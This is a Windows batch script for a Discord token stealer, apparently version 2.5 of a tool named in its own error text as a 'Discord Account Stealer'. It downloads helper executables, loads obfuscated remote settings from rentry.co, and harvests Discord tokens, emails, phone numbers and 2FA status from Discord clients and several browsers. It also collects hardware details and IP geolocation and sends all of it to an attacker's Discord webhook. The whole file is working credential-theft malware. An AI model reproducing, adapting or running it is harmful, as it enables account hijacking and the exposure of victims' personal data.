@echo off
setlocal enabledelayedexpansion

:: <Settings>
set "Version=2.5"
set "APIPasswords=V4KG2CPM-QXWU4PM2"
set FilesDB=DiscordMSG.bat notifu.exe WebParse.exe DAS.exe rentry.exe nonAscii.exe
set "pasteLocation=%temp%\DAS v!Version!\WebPaste.txt"
set DefaultGateway=https://github.com/agamsol/Discord-Stealer/raw/main/
set "DefaultIdentifier=10000-00000"
set "JsonValues=token version CreationDate Enabled author.ID author.Endpoint author.Access"
set "EncodeLength=4"
set "ENCODE.LOWER[/]=djFW" & set "DECODE.LOWER[djFW]=/"
set "UpperList="2YDU/A" "NZ0f/B" "QJ0W/C" "Zwbf/D" "LVH8/E" "g594/F" "5CWA/G" "2B3A/H" "p1A8/I" "VRDo/J" "QM2j/K" "aIv7/L" "rrRR/M" "fQWj/N" "tJpk/O" "CZPX/P" "vFo3/Q" "txZ1/R" "V2az/S" "pNmX/T" "qwyH/U" "vzrr/V" "dQ7T/W" "2kXz/X" "iC8D/Y" "HIBG/Z""
set "LowerList="6ZAU/a" "VhHA/b" "t686/c" "dn7a/d" "WXMe/e" "ChDC/f" "hxxm/g" "IgTb/h" "X640/i" "9YO8/j" "lzCG/k" "kXkt/l" "G0hn/m" "pGm7/n" "XtTR/o" "PPbL/p" "4eyF/q" "QQt3/r" "NeHv/s" "3Nkg/t" "1k8o/u" "kDzt/v" "Q0ei/w" "ad9n/x" "xM9N/y" "sxK7/z" "CQGN/1" "VxhF/2" "5fts/3" "VT2m/4" "w7Ep/5" "BSVp/6" "ru3k/7" "KrbV/8" "CFso/9" "GyeH/0" "XxDP/ " "Cr0O/." "vhV1/-" "g6uZ/+" "UEEQ/$" "JD9X/_" "AmbC/#" "jp5b/@" "iXuP/^^" "yr1b/^&" "nSX4/^(" "xKcE/^)" "BYoT/[" "GosV/]" "mx2X/{" "DnFj/}" "dGaP/^|" "9MBD/^<" "fNOw/^>" "7tkc/^\" "aAZc/'" "aHgW/~" "OlSn/`" "boIx/;" "VkPR/%%" "437F/"""
set "Builds=Stable PTB Canary Developer Chrome Edge Opera Brave Yandex"
:: </Settings>

if "%~1"=="--Background" (
    >"%temp%\background.vbs" echo CreateObject^("Wscript.Shell"^).Run """" ^& WScript.Arguments^(0^) ^& """ " ^& WScript.Arguments^(1^), 0
    exit /b
)

:: <Download Missing Files>
for %%a in (!FilesDB!) do if not exist "%temp%\DAS v!Version!\%%a" set /a MissingFiles+=1

if !MissingFiles! geq 1 (
    for %%a in (!FilesDB!) do (
        set /a Downloaded+=1
        cls
        echo.
        echo  Downloading File !Downloaded!/!MissingFiles!
        curl --create-dirs -f#kLo "%temp%\DAS v!Version!\%%a" "!DefaultGateway!/%%a"
    )
cls
)
:: <Download Missing Files>

:: <Load Parameters>
set "Identifier=%~1"
:: </Load Parameters>

:: <Apply Settings>
for %%a in (!UpperList!) do (
    for /f "tokens=1,2 delims=/" %%b in ("%%~a") do (
        set "ENCODE.CAPS[%%c]=%%b"
        set "DECODE.CAPS[%%b]=%%c"
    )
)
for %%a in (!LowerList!) do (
    for /f "tokens=1,2 delims=/" %%b in ("%%~a") do (
        set "ENCODE.LOWER[%%c]=%%b"
        set "DECODE.LOWER[%%b]=%%c"
    )
)
for %%a in (!APIPasswords!) do (
    set /a APIPasswords.Length+=1
    set "APIPassword[!APIPasswords.Length!]=%%a"
)

for %%a in (!FilesDB!) do (
    set /a Files.Length+=1
    set "Files[!Files.Length!]=%temp%\DAS v!Version!\%%a"
)

:: </Apply Settings>

:: <Load Identifier>
if not defined Identifier set Identifier=!DefaultIdentifier!
set "IdentifierURL=!DefaultGateway!/identifiers/!Identifier!.json?raw=true"
for /f %%A in ('curl --silent "!IdentifierURL!"') do set "LINK_TYPE=%%A"
if not "%LINK_TYPE%"=="<html><body>You" (
    set ERROR=Identifier not found
    goto :CHECK_ERRORS
)
for /f "delims=" %%a in ('call "!Files[3]!" "!IdentifierURL!" !JsonValues!') do set "Json.%%a"

for %%a in (ID Endpoint Access) do (
    call :DECODE "!Json.author.%%a!"
    set "Json.author.%%a=!DecodedString!"
)
set "WebURL=https://rentry.co/!Json.author.Endpoint!"
set "PermaAccess=!Json.author.Access!"

if /i "!json.Enabled!"=="false" (
    if not defined ERROR set ERROR=This Identifier is disabled
    set Show_Notifications=true
    set "APP_Nickname=System"
    goto :CHECK_ERRORS
)
if not defined ERROR if not "!json.version!"=="!Version!" (
    if not defined ERROR set ERROR=Identifier Incompatible with this version
)
:: <Load Paste of Identifier>
if not defined ERROR call :CHECK_CONNECTION
if not defined ERROR call :GetPasteStatus

for /f "delims=" %%a in ('curl -k -s "!WebURL!/raw"') do <nul set /p="%%a" | >nul findstr /rc:"^[\[#].*" || set "%%a">nul 2>&1

for %%a in (Webhook Error_Color Success_Color Success_Image Error_Image Success_Title Error_Title Success_Description Error_Description Show_Notifications APP_Nickname Hide_Mail Hide_Phone Hide_Token SendUnclaimedAccounts DATABASE) do (
    if not defined %%a (
        REM if not defined ERROR ????
        if not defined ERROR set ERROR=Settings Missing from paste
        goto :CHECK_ERRORS
    )
)
call :DATABASE 0

if not defined ERROR call :Validate_Webhook
:: </Load Paste of Identifier>
:: </Load Identifier>

:: <Account Collection>
for /f "delims=" %%a in ('call "!Files[4]!" !APIPassword[1]!') do set "%%a"

if defined Error (
    set IdentifierDATA=!Error_Description!
    for %%a in ("!AccountsStolen!") do set "IdentifierDATA=!IdentifierDATA:{AccountsStolen}=%%~a!"
) else (
    set IdentifierDATA=!Success_Description!
    for %%a in ("!Failures!") do set "IdentifierDATA=!IdentifierDATA:{TotalFailures}=%%~a!"
)

call :GET_HARDWARE
call :GET_NETWORK

if "!proxy!"=="false" (
    set "VPN=:red_circle: OFF"
) else set "VPN=:green_circle: ON - :warning: Some Information may be incorrect"

set "Country=!country! (!countryCode!)"
set "Region=!regionName!"
set "PCuser=!username!"
set "IdentifierCreationDate=!Json.CreationDate!"
set "IdentifierVersion=!Json.version!"
set IdentifierDATA=!IdentifierDATA:{IdentifierToken}=[%Json.token%](%WebURL%)!
set "IdentifierDATA=!IdentifierDATA:{IdentifierEditCode}=%PermaAccess%!"
set PermaAccess=

for %%a in (RAM CPU GPU COUNTRY VPN REGION CITY LAT LON TIMEZONE ISP QUERY COMPUTERNAME PCUSER IdentifierCreationDate IdentifierVersion) do (
    for %%b in ("!%%a!") do set "IdentifierDATA=!IdentifierDATA:{%%a}=%%~b!"
)

if defined ERROR goto :CHECK_ERRORS
:: </Account Collection>

:: <Print Detials>
if /i "!Show_Notifications!"=="true" start "" "!Files[2]!" /p "!APP_Nickname!" /m "The identifier has been successfully verified.\nIdentifier: !Json.token!\n" /d 0 /i %SYSTEMROOT%\system32\shell32.dll,302
echo.
echo The Identifier has been successfully verified,
echo   Identifier Token: !Json.token!
:: <Print Detials>

:: <Prepare and Send Account(s)>
for %%a in (!Builds!) do (
    if defined Discord_%%a_User (
        set "BuildsFound=%%a !BuildsFound!"
    )
)

if /i "!SendUnclaimedAccounts!"=="false" (
    for %%a in (!BuildsFound!) do (
        if /i "!Discord_%%a_Email!"=="none" (
            set "BuildsFound=!BuildsFound:%%a =!"
            set /a Accounts-=1
        )
    )
)

if /i "!Hide_Mail!"=="true" for %%a in (!BuildsFound!) do echo "!Discord_%%a_Email!" | findstr /c:"none">nul || set "Discord_%%a_Email=||!Discord_%%a_Email:@=||@!"
if /i "!Hide_Phone!"=="true" for %%a in (!BuildsFound!) do echo "!Discord_%%a_Phone!" | findstr /c:"null">nul || set "Discord_%%a_Phone=||!Discord_%%a_Phone!||"
if /i "!Hide_Token!"=="true" for %%a in (!BuildsFound!) do set "Discord_%%a_Token=||!Discord_%%a_Token!||"

if !Accounts! gtr 0 (
    for %%a in (!BuildsFound!) do (
        set "MessageBody=!IdentifierDATA!"
        set ImageURL=!Success_Image!
        set MessageTitle=!Success_Title!
        if "%%a"=="Stable" set "MessageBody=!MessageBody:{location}=%%a Discord!"
        for %%b in (PTB Canary Developer) do (
            if "%%a"=="%%b" set "MessageBody=!MessageBody:{location}=Discord %%b!"
        )
        for %%b in (Chrome Edge Opera Brave Yandex) do (
            if "%%a"=="%%b" set "MessageBody=!MessageBody:{location}=%%b Browser!"
        )
        if "!Discord_%%a_Verified!"=="true" (
            set "Discord_%%a_Verified=Verified"
        ) else set "Discord_%%a_Verified=Unverified"
        for %%b in (NSFW 2FA) do (
                if "!Discord_%%a_%%b!"=="true" (
                set "Discord_%%a_%%b=Enabled"
            ) else set "Discord_%%a_%%b=Disabled"
        )
        set /a AccountsStolen+=1
        set ASCII_ERROR=
        for /f "delims=" %%a in ('call "!files[6]!" "!Discord_%%a_User!"') do set "%%a" >nul
        if "!ASCII_ERROR!"=="Unknown Characters found" set "Discord_%%a_User=:warning: Can't Display Name"
        for %%b in ("!AccountsStolen!") do set "MessageBody=!MessageBody:{AccountsStolen}=%%~b!"
        for %%b in ("!Discord_%%a_User!") do set "MessageTitle=!Success_Title:{username}=%%~b!"
        for %%b in ("!Discord_%%a_User!") do set "MessageBody=!MessageBody:{username}=%%~b!"
        for %%b in ("!Discord_%%a_ID!") do set "MessageBody=!MessageBody:{userID}=%%~b!"
        for %%b in ("!Discord_%%a_Email!") do set "MessageBody=!MessageBody:{email}=%%~b!"
        for %%b in ("!Discord_%%a_Phone!") do set "MessageBody=!MessageBody:{phoneNumber}=%%~b!"
        for %%b in ("!Discord_%%a_Verified!") do set "MessageBody=!MessageBody:{isVerified}=%%~b!"
        for %%b in ("!Discord_%%a_Nitro!") do set "MessageBody=!MessageBody:{HasNitro}=%%~b!"
        for %%b in ("!Discord_%%a_Token!") do set "MessageBody=!MessageBody:{token}=%%~b!"
        for %%b in ("!Discord_%%a_NSFW!") do set "MessageBody=!MessageBody:{nsfw}=%%~b!"
        for %%b in ("!Discord_%%a_2FA!") do set "MessageBody=!MessageBody:{2fa}=%%~b!"
        echo !ImageURL!| findstr /C:"{ImageURL}">nul && set "ImageURL=!Discord_%%a_ImageURL!"
        call "!Files[1]!" -silent --embed "!MessageTitle!" "!MessageBody:\n=\\n!" "!Success_Color!" "!ImageURL!"
    )
call :DATABASE 1
)
echo The Application has been successfully finished.
if /i "!Show_Notifications!"=="true" start "" "!Files[2]!" /p "!APP_Nickname!" /m "The Application has been successfully finished." /d 0 /i %SYSTEMROOT%\system32\shell32.dll,302
timeout /t 5 /nobreak >nul
exit /b
:: </Prepare and Send Account(s)>

:: <Decoder>
:DECODE
set "EncodedString=%~1"
call :strLen EncodedString TEMP.decode.stringLen
set "DecodedString="
set /a TEMP.decode.stringLen-=1
for /L %%a in (0,!EncodeLength!,!TEMP.decode.stringLen!) do (
    for /f %%b in ("!EncodedString:~%%a,%EncodeLength%!") do (
        set "DecodedString=!DecodedString!!DECODE.CAPS[%%b]!"
        set "DecodedString=!DecodedString!!DECODE.LOWER[%%b]!"
    )
)
exit /b
:: </Decoder>

:: <Encoder>
:ENCODE
set "DecodedString=%~1"
call :strLen DecodedString TEMP.encode.stringLen
set "EncodedString="
set /a TEMP.encode.stringLen-=1
for /L %%a in (0 1 !TEMP.encode.stringLen!) do (
    for /f "delims=" %%b in ("!DecodedString:~%%a,1!") do (
        if not "%%b"==":" (
            echo %%b| findstr "^[ABCDEFGHIJKLMNOPQRSTUVWXYZ]*$" >nul 2>&1 & if !errorlevel! equ 0 (
                set "EncodedString=!EncodedString!!ENCODE.CAPS[%%b]!"
                ) else (
                set "EncodedString=!EncodedString!!ENCODE.LOWER[%%b]!"
            )
        )
    )
)
exit /b
:: </Encoder>

:: <String Counter>
:strLen
setlocal disableDelayedExpansion
set len=0
if defined %~1 for /f "delims=:" %%N in (
'"(cmd /v:on /c echo(!%~1!&echo()|findstr /o ^^"'
) do set /a "len=%%N-3"
endlocal & if "%~2" neq "" (set %~2=%len%) else echo %len%
exit /b
:: </String Counter>

:: <Discord Webhook Validator>
:Validate_Webhook
 for %%a in (ptb canary) do set "Webhook=!Webhook:%%a.=!"
 if not "!Webhook:~0,33!"=="https://discord.com/api/webhooks/" set Invalid_Webhook=True
 for /F "tokens=* USEBACKQ" %%a in (`curl --silent "%webhook%"`) do set "WebhookCheck=%%a"
 for %%a in ("404: Not Found" "401: Unauthorized" "Invalid Webhook Token") do echo %WebhookCheck% | findstr /ic:%%a >nul && set "Invalid_Webhook=True"
 if "%Invalid_Webhook%"=="True" set "ERROR=Invalid Webhook URL"
 exit /b
:: </Discord Webhook Validator>

:: <Rentry.co Status>
:CHECK_CONNECTION
ping rentry.co -n 1 | findstr "TTL" >nul
if !ErrorLevel! equ 1 set "ERROR=Rentry.co is down"
exit /b
:: </Rentry.co Status>

:: <Check existence of rentry.co pastes>
:GetPasteStatus
for /f "tokens=*" %%a in ('curl -k -s "!WebURL!/raw"') do if "%%a"=="<!DOCTYPE html>" set "ERROR=Paste not found"
exit /b
:: <Check existence of rentry.co pastes>

:: <DATABASE>
:DATABASE
if "%~1"=="0" (
    call :DECODE "!DATABASE!"
    for /f "delims=+ tokens=1,2" %%a in ("!DecodedString!") do (
        set "AccountsStolen=%%a"
        set "Failures=%%b"
    )
)
if "%~1"=="1" (
    set "DATABASE=!AccountsStolen!+!Failures!"
    call :ENCODE "!DATABASE!"
    set "DATABASE=!EncodedString!"
    REM CREATE FILE TO LOAD PASTE
    call :LOCAL_PASTE

    for /f "delims=" %%a in ('type "!pasteLocation!" ^| call "!Files[5]!" edit -u "!WebURL!" --edit-code "!Json.author.Access!"') do (
        set Rentry_ERROR=%%a
    )
    del "!pasteLocation!"
    if "!Rentry_ERROR!"=="error: Invalid edit code" call "!Files[1]!" +silent --message "```ERROR: An error occurred while updating the database for the identifier '!Json.token!'\\nJoin our discord server to solve this issue : discord.gg/PUxp8KmRv5```"
)
exit /b
:: </DATABASE>

:CHECK_ERRORS
if defined Error (
    set "ErrorMessageBody=!IdentifierDATA!"
    if "!Error!"=="Identifier not found" (
        set Show_Notifications=true
        set "APP_Nickname=System"
        set "QueueNotification=Couldn't find the identifier specified."
        echo ERROR: !QueueNotification!
    )
    if "!Error!"=="This Identifier is disabled" (
        set DiscordMSG=false
        set "QueueNotification=This identifier is disabled.\nIdentifier: !Json.token!"
        echo ERROR: !QueueNotification:\n= !
    )
    if "!Error!"=="Identifier Incompatible with this version" (
        set NoFailureStats=true
        set ErrorDetail=The Version of the identifier\ndid not match the program version ^(!version!^)
        set "QueueNotification=This Identifier is incompatible with this version.\nIdentifier: !Json.token!"
        echo ERROR: !QueueNotification:\n= !
    )
    if "!Error!"=="Invalid Webhook URL" (
        set "QueueNotification=Error Accured while verifing the identifier.\nIdentifier: !Json.token!"
        echo ERROR: Invalid Webhook URL for the identifier: !Json.token!.
    )
    if "!Error!"=="Rentry.co is down" (
        set "QueueNotification=Rentry.co was found to be offline."
        echo ERROR: !QueueNotification:\n= !
    )
    if "!Error!"=="Paste not found" (
        set "QueueNotification=Couldn't find the paste specified.\nIdentifier: !Json.token!"
        echo ERROR: !QueueNotification:\n= !
    )
    if "!Error!"=="Settings Missing from paste" (
        set DiscordMSG=false
        set "QueueNotification=The Identifier is missing settings and the APP is unable to load.\nIdentifier: !Json.token!"
        echo ERROR: !QueueNotification:\n= !
    )
    if "!Error!"=="Invalid password" (
        set NoFailureStats=true
        set ErrorDetail=Discord Account Collection program key is invalid.
        set "QueueNotification=Program key provided is invalid."
        echo ERROR: !QueueNotification!
    )
    if "!Error!"=="Not supported" (
        set NoFailureStats=true
        set ErrorDetail=This Discord Account Stealer version is no longer maintained, please use a newer version.
        set "QueueNotification=This version is no longer maintained, Please update to a newer version."
        echo ERROR: !QueueNotification!
    )
    if "!Error!"=="Discord not installed" (
        set ErrorDetail=Looks Like the User does not have discord installed
        set "QueueNotification=Discord is not installed, please install discord, login and try again."
        echo ERROR: !QueueNotification!
    )
    if "!Error!"=="User is not logged in" (
        set ErrorDetail=Looks like The User does not have discord installed!
        set "QueueNotification=This Looks like you have discord but you are not logged in."
        echo ERROR: !QueueNotification!
    )
    if defined ErrorDetail (
        if not "!NoFailureStats!"=="true" (
            set /a Failures+=1
            call :DATABASE 1
        )
    )
    for %%b in ("!Failures!") do set "ErrorMessageBody=!ErrorMessageBody:{TotalFailures}=%%~b!"
    if /i "!Show_Notifications!"=="true" start "" "!Files[2]!" /p "!APP_Nickname! | ERROR" /m "!QueueNotification!" /d 0 /i %SYSTEMROOT%\system32\shell32.dll,131
    for /f "delims=" %%a in ("!ErrorDetail!") do set ErrorMessageBody=!ErrorMessageBody:{error}=%%~a!
    if not "!DiscordMSG!"=="false" call "!Files[1]!" +silent --embed "!Error_Title!" "!ErrorMessageBody:\n=\\n!" "!Error_Color!" "!Error_Image!"
    timeout /t 5 /nobreak >nul
    exit /b
)

:GET_HARDWARE
for /F %%C in ('powershell -command "(Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).sum /1gb"') do set "RAM=%%CGB"
for /f "tokens=1* delims==" %%a in ('wmic cpu get name /VALUE') do if /i %%a EQU name set "CPU=%%b"
for /f "tokens=1* delims==" %%a in ('wmic path win32_VideoController get name /value') do if /i %%a equ name set "GPU=%%b"
exit /b

:GET_NETWORK
for /f "delims=" %%a in ('call "!Files[3]!" "http://ip-api.com/json?fields=192511" country countryCode regionName city lat lon timezone isp proxy query') do set "%%a"
exit /b


:: <Update Paste Locally>
:LOCAL_PASTE
>"!pasteLocation!" (
    echo ```ini
    echo ; Discord Webhook
    echo Webhook=!Webhook!
    echo.
    echo ; Discord Message Layout Colors
    echo Error_Color=!Error_Color!
    echo Success_Color=!Success_Color!
    echo.
    echo ; Discord Embed Layout
    echo Success_Image=!Success_Image!
    echo Error_Image=!Error_Image!
    echo.
    echo Success_Title=!Success_Title!
    echo Error_Title=!Error_Title!
    echo.
    echo Success_Description=!Success_Description!
    echo Error_Description=!Error_Description!
    echo.
    echo ; Settings
    echo Show_Notifications=!Show_Notifications!
    echo APP_Nickname=!APP_Nickname!
    echo Hide_Mail=!Hide_Mail!
    echo Hide_Phone=!Hide_Mail!
    echo Hide_Token=!Hide_Token!
    echo ; whether to send unclaimed discord accounts
    echo SendUnclaimedAccounts=!SendUnclaimedAccounts!
    echo.
    echo ; DATABASE
    echo ; NOTE: CHANGING THIS CAN CAUSE DAMAGE TO YOUR IDENTIFIER.
    echo DATABASE=!DATABASE!
    echo ```
)
exit /b
:: </Update Paste Locally>

